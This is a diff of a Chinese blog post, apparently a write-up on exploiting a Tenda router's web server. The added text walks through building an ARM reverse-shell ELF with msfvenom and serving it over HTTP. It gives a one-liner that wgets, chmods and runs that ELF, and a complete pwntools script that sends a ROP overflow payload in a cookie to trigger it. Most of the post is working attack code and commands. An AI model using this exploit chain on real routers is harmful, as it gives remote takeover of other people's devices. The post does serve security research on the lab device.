@@ -15,13 +15,22 @@
 <meta property="og:site_name" content="ZhouYetao">
 <meta property="og:description" content="上一篇讲到成功将tenda的路由器getshell，在这篇，主要讲通过msf对其进行反弹shell">
 <meta property="og:locale">
+<meta property="og:image" content="http://example.com/images/pasted-103.png">
+<meta property="og:image" content="http://example.com/images/pasted-104.png">
+<meta property="og:image" content="http://example.com/images/pasted-105.png">
+<meta property="og:image" content="http://example.com/images/pasted-106.png">
+<meta property="og:image" content="http://example.com/images/pasted-107.png">
+<meta property="og:image" content="http://example.com/images/pasted-109.png">
+<meta property="og:image" content="http://example.com/images/pasted-110.png">
+<meta property="og:image" content="http://example.com/images/pasted-111.png">
 <meta property="article:published_time" content="2021-09-19T15:57:00.000Z">
-<meta property="article:modified_time" content="2021-09-20T06:57:56.514Z">
+<meta property="article:modified_time" content="2021-09-20T07:41:38.951Z">
 <meta property="article:author" content="ZhouYetao">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="iot">
 <meta property="article:tag" content="reverse_shell">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/pasted-103.png">
   
     <link rel="alternative" href="/atom.xml" title="ZhouYetao" type="application/atom+xml">
   
@@ -183,8 +192,53 @@
 
 <h4 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h4><p>在上一篇文章中，虽然成功的getshell了，但是没法通过本机实现操控，所以这篇主要讲如何反弹shell。</p>
 <h4 id="环境测试"><a href="#环境测试" class="headerlink" title="环境测试"></a>环境测试</h4><p>本想通过bash对其进行反弹shell，但是碰到了很无语的问题：</p>
-<p>这边没有这个命令，所以只能另想办法，继续对环境进行测试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/armle/shell/reverse_tcp LHOST=192.168.5.5 LPORT=4444 -f elf &gt; payload.elf</span><br><span class="line">msf:</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/armle/shell/reverse_tcp</span><br><span class="line">set lhost 192.168.5.5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-103.png" alt="upload successful"></p>
+<p>这边没有这个命令，所以只能另想办法，继续对环境进行测试其他的命令：</p>
+<p><img src="/images/pasted-104.png" alt="upload successful"></p>
+<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>发现可以使用chmod、wget命令，这个时候，就有了利用的思路：</p>
+<p>1、首先利用msf生成基于armle的反弹shell木马；</p>
+<p>2、通过远程命令执行，通过wget下载该木马；</p>
+<p>3、执行木马，利用msf来接收。</p>
+<h5 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h5><p>需要下载msf，ubuntu直接下载可能会出现问题，我采用的是这种方法：</p>
+<p>首先进入<a target="_blank" rel="noopener" href="https://apt.metasploit.com/%EF%BC%8C%E6%8B%89%E5%88%B0%E6%9C%80%E4%BD%8E%EF%BC%8C%E4%B8%8B%E8%BD%BD.deb%E6%96%87%E4%BB%B6%EF%BC%8C%E9%9A%8F%E5%90%8E%E8%BF%9B%E5%85%A5%E5%88%B0%E8%AF%A5%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%AD%EF%BC%8C%E6%89%A7%E8%A1%8C">https://apt.metasploit.com/，拉到最低，下载.deb文件，随后进入到该文件的文件夹中，执行</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i + xxx.deb</span><br></pre></td></tr></table></figure>
+<p>然后输入msfconsole之后，如果出现以下界面，那么说明安装成功：</p>
+<p><img src="/images/pasted-105.png" alt="upload successful"></p>
+<p>附上msf的更新命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfupdate</span><br></pre></td></tr></table></figure>
+
+<p>随后推出msf，运用msfvenom命令生成木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/armle/shell/reverse_tcp LHOST=192.168.5.5 LPORT=4444 -f elf &gt; payload.elf</span><br></pre></td></tr></table></figure>
+<p>这是，执行该命令的目录下会多一个名为payload.elf的文件。</p>
+<h5 id="配置本地http-server"><a href="#配置本地http-server" class="headerlink" title="配置本地http.server"></a>配置本地http.server</h5><p>在包含payload.elf文件的文件夹中，输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-106.png" alt="upload successful"></p>
+<p>这时候，就可以通过wget下载该文件目录下的文件了。</p>
+<h5 id="wget下载木马"><a href="#wget下载木马" class="headerlink" title="wget下载木马"></a>wget下载木马</h5><p><img src="/images/pasted-107.png" alt="upload successful"></p>
+<p>这边成功下载payload.elf，但是这里一定要注意在wget的时候一定要加上http://头，以及输正确8000端口号。</p>
+<p>下载完毕之后，一定要记得通过chmod给文件加上运行权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x *</span><br></pre></td></tr></table></figure>
+
+<p>然后新开起一个终端，输入msfconsole打开msf，先进行配置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/armle/shell/reverse_tcp</span><br><span class="line">set lhost 192.168.5.5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-109.png" alt="upload successful"></p>
+<p>进入到路由器界面，输入命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-110.png" alt="upload successful"></p>
+<p>发现成功获得了shell。</p>
+<h4 id="使用一句话命令"><a href="#使用一句话命令" class="headerlink" title="使用一句话命令"></a>使用一句话命令</h4><p>在整合命令之前，介绍两个常用的linux命令连接的符号，一个是“；”，一个是“&amp;&amp;”。</p>
+<p>“；”的意思就是一次执行命令，不管前一个命令是否成功执行，都会进行下一个命令的执行；而“&amp;&amp;”命令则是在执行前一个命令成功的基础上，才会继续执行下一个命令，所以这里对一句话命令的构造为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.5.5:8000/payload.elf &amp;&amp; chmod +x * &amp;&amp; ./payload.elf</span><br></pre></td></tr></table></figure>
+
+<h4 id="exp整合"><a href="#exp整合" class="headerlink" title="exp整合"></a>exp整合</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">#cmd = &quot;/bin/sh&quot;</span><br><span class="line">cmd = &quot;wget http://192.168.5.5:8000/payload.elf &amp;&amp; chmod +x * &amp;&amp; ./payload.elf&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = ELF(&quot;./httpd&quot;)</span><br><span class="line">libc = ELF(&quot;libc.so.0&quot;)</span><br><span class="line"></span><br><span class="line">def getshell():</span><br><span class="line">    #getshell</span><br><span class="line">    libc_base = 0xff5d5000#0xff5c6000</span><br><span class="line">    system_addr = libc_base + libc.sym[&quot;system&quot;]</span><br><span class="line">    # print(hex(system_addr))</span><br><span class="line">    gadget1 = libc_base + 0x00018298</span><br><span class="line">    gadget2 = libc_base + 0x00040cb8</span><br><span class="line">    payload1 = &quot;A&quot;*444 +&quot;.png&quot; + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd</span><br><span class="line"></span><br><span class="line">    url = &quot;http://192.168.5.5/goform/xxx&quot;</span><br><span class="line">    # print(payload1)</span><br><span class="line">    cookie = &#123;&quot;Cookie&quot;:&quot;password=&quot;+payload1&#125;</span><br><span class="line">    log.success(&quot;getshell&quot;)</span><br><span class="line">    log.success(&quot;reverse_tcp_shell&quot;)</span><br><span class="line">    ret = requests.get(url=url, cookies=cookie)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    getshell()</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Wrong libc base.&quot;)</span><br><span class="line"># print(put_got)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="测试exp"><a href="#测试exp" class="headerlink" title="测试exp"></a>测试exp</h5><p>将路由器root目录下的payload.elf删除，执行exp：</p>
+<p><img src="/images/pasted-111.png" alt="upload successful"></p>
+<p>成功反弹shell。</p>
+
       
 
       
@@ -464,15 +518,15 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">fmt</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">reverse_shell</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">stackoverflow</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">fmt</a>
               </li>
             
             <div class="clearfix"></div>
